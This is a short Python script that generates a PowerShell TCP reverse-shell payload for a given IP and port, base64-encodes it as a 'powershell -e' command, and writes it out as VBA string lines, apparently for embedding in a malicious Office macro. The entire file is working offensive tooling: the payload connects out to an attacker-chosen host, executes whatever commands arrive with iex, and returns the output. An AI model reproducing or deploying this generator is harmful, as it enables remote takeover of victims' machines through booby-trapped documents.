#!/usr/bin/env python3
import sys
import base64

# Function to print help message
def help():
    print("USAGE: %s IP PORT" % sys.argv[0])
    print("Returns VBA formatted reverse shell payload connecting to IP:PORT")
    exit()

# Validate and parse arguments for IP and Port
try:
    (ip, port) = (sys.argv[1], int(sys.argv[2]))
except:
    help()

# Create the PowerShell payload
payload = '$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
payload = payload % (ip, port)

# Encode payload
cmdline = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

# Convert the payload into VBA format
n = 50
with open("payload.txt", "w") as f:
    for i in range(0, len(cmdline), n):
        f.write("    Str = str+" + '"' + cmdline[i:i+n] + '"\n')
